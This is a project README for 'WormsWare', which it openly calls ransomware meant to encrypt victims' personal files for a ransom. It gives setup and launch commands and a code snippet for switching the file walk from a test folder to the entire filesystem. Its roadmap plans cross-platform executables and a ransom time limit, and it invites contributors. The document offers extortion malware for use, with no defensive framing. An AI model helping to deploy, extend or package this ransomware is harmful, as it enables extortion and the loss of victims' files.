<div id="top"></div>

<!-- PROJECT LOGO -->
<br />
<div align="center">
  <a href="https://github.com/FixxYleB3st/WormsWare">
    <img src="images/logo.png" alt="Logo" width="80" height="80">
  </a>

<h3 align="center">WormsWare</h3>

  <p align="center">
    Open source ransomware
    <br />
    <a href="https://github.com/FixxYleB3st/WormsWare"><strong>Explore the docs »</strong></a>
    <br />
    <br />
    <a href="https://github.com/FixxYleB3st/WormsWare">View Demo</a>
    ·
    <a href="https://github.com/FixxYleB3st/WormsWare/issues">Report Bug</a>
    ·
    <a href="https://github.com/FixxYleB3st/WormsWare/issues">Request Feature</a>
  </p>
</div>



<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#about-the-project">About The Project</a>
      <ul>
        <li><a href="#built-with">Built With</a></li>
      </ul>
    </li>
    <li>
      <a href="#getting-started">Getting Started</a>
      <ul>
        <li><a href="#prerequisites">Prerequisites</a></li>
        <li><a href="#installation">Installation</a></li>
      </ul>
    </li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#roadmap">Roadmap</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
    <li><a href="#acknowledgments">Acknowledgments</a></li>
  </ol>
</details>



<!-- ABOUT THE PROJECT -->
## About The Project

[![Product Name Screen Shot][product-screenshot]](https://example.com)

A completely open source ransomware project. It aims to encrypt the victim's personal files for a ransom. WormsWare
uses asymmetric key encryption and Fernet (another encryption technology), which reduces the risk of key cracking. Several future updates are planned in the future adding features. 

<p align="right">(<a href="#top">back to top</a>)</p>



### Built With

* [cryptography](https://pypi.org/project/cryptography/)
* [pycryptodome](https://pypi.org/project/pycryptodome/)

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- GETTING STARTED -->
## Getting Started


### Prerequisites

* [Python 3.x](https://www.python.org/downloads/)

### Installation

1. Clone the repo
   ```sh
   git clone https://github.com/FixxYleB3st/WormsWare.git
   ```
2. Install the required python modules 
   ```sh
   pip install -r requirements.txt
   ```
3. Run "gen_rsa_key.py" to generate the private and public key
   ```sh
   py gen_rsa_key.py
   ```


<p align="right">(<a href="#top">back to top</a>)</p>



<!-- USAGE EXAMPLES -->
## Usage

To launch the ransomware, you just have to run 
```sh
py main.py
```
 Be careful not to run the script on your machine, as it may self-infect. If you want to do a test, go to ``main.py`` and replace line 55 and 56 with this: 
```py
# for root, dirs, files in os.walk("/"): # If you want encrypt all the commputer
for root, dirs, files in os.walk("<test_path>/"): # for test | it's a security
```

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- ROADMAP -->
## Roadmap

- [] Change the organization of ``main.py`` with a class
- [] Make an executable
      - [] Windows
      - [] Linux
      - [] Mac
- [] Add time limit


See the [open issues](https://github.com/github_username/repo_name/issues) for a full list of proposed features (and known issues).

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- CONTRIBUTING -->
## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- LICENSE -->
## License

Distributed under the MIT License. See `LICENSE.txt` for more information.

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- CONTACT -->
<!--## Contact

FixxY - [@twitter_handle](https://twitter.com/twitter_handle) - email@email_client.com

Project Link: [https://github.com/github_username/repo_name](https://github.com/github_username/repo_name)

<p align="right">(<a href="#top">back to top</a>)</p>-->






<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[contributors-shield]: https://img.shields.io/github/contributors/github_username/repo_name.svg?style=for-the-badge
[contributors-url]: https://github.com/github_username/repo_name/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/github_username/repo_name.svg?style=for-the-badge
[forks-url]: https://github.com/github_username/repo_name/network/members
[stars-shield]: https://img.shields.io/github/stars/github_username/repo_name.svg?style=for-the-badge
[stars-url]: https://github.com/github_username/repo_name/stargazers
[issues-shield]: https://img.shields.io/github/issues/github_username/repo_name.svg?style=for-the-badge
[issues-url]: https://github.com/github_username/repo_name/issues
[license-shield]: https://img.shields.io/github/license/github_username/repo_name.svg?style=for-the-badge
[license-url]: https://github.com/github_username/repo_name/blob/master/LICENSE.txt
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://linkedin.com/in/linkedin_username
[product-screenshot]: images/Capture.jpg
